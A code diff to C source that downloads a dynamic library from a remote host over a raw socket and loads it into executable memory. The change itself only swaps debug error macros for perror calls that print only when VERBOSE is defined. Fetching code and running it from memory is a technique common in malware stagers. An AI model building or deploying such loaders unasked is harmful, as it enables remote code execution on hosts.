@@ -19,18 +19,12 @@
         do { \
             fprintf(stdout, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
         } while (0)
-    #define DEBUG_PERROR(fmt, ...) \
-        do { \
-            fprintf(stderr, "DEBUG: " fmt ": %s\n", ##__VA_ARGS__, strerror(errno)); \
-        } while (0)
     #define DEBUG_FPRINTF(stream, fmt, ...) \
         do { \
             fprintf(stream, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
         } while (0)
 #else
     #define DEBUG_PRINT(fmt, ...) \
-        do { } while (0)
-    #define DEBUG_PERROR(fmt, ...) \
         do { } while (0)
     #define DEBUG_FPRINTF(stream, fmt, ...) \
         do { } while (0)
@@ -66,7 +60,9 @@ int create_socket(const char *hostname, int port) {
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
-        DEBUG_PERROR("Error opening socket");
+        #ifdef VERBOSE
+        perror("Error opening socket");
+        #endif
         exit(1);
     }
 
@@ -82,7 +78,9 @@ int create_socket(const char *hostname, int port) {
     memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
 
     if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        DEBUG_PERROR("Error connecting to server");
+        #ifdef VERBOSE
+        perror("Error connecting to server");
+        #endif
         exit(1);
     }
 
@@ -118,7 +116,9 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
 
                 mem.data = malloc(content_size);
                 if (!mem.data) {
-                    DEBUG_PERROR("malloc failed");
+                    #ifdef VERBOSE
+                    perror("malloc failed");
+                    #endif
                     close(sockfd);
                     exit(1);
                 }
@@ -130,7 +130,9 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
         } else {
             mem.data = realloc(mem.data, mem.size + bytes_read);
             if (!mem.data) {
-                DEBUG_PERROR("realloc failed");
+                #ifdef VERBOSE
+                perror("realloc failed");
+                #endif
                 close(sockfd);
                 exit(1);
             }
@@ -140,7 +142,9 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
     }
 
     if (bytes_read < 0) {
-        DEBUG_PERROR("recv failed");
+        #ifdef VERBOSE
+        perror("recv failed");
+        #endif
     }
 
     close(sockfd);
@@ -150,14 +154,18 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
 void *load_dylib_from_memory(struct Memory *mem) {
     void *mem_fd = mmap(NULL, mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
     if (mem_fd == MAP_FAILED) {
-        DEBUG_PERROR("mmap failed");
+        #ifdef VERBOSE
+        perror("mmap failed");
+        #endif
         return NULL;
     }
 
     memcpy(mem_fd, mem->data, mem->size);
 
     if (mprotect(mem_fd, mem->size, PROT_READ | PROT_EXEC) == -1) {
-        DEBUG_PERROR("mprotect failed");
+        #ifdef VERBOSE
+        perror("mprotect failed");
+        #endif
         return NULL;
     }
 
